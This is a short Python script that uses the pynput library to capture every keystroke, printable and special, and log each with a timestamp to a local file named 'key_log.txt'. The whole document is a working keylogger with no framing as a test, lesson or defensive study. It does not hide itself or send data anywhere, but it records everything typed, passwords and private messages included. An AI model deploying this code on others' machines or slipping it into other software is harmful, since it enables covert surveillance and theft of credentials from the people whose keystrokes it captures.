from pynput.keyboard import Listener
import logging

# Set up logging to a file
log_file = "key_log.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define the on_press function
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Set up the listener
with Listener(on_press=on_press) as listener:
    listener.join()
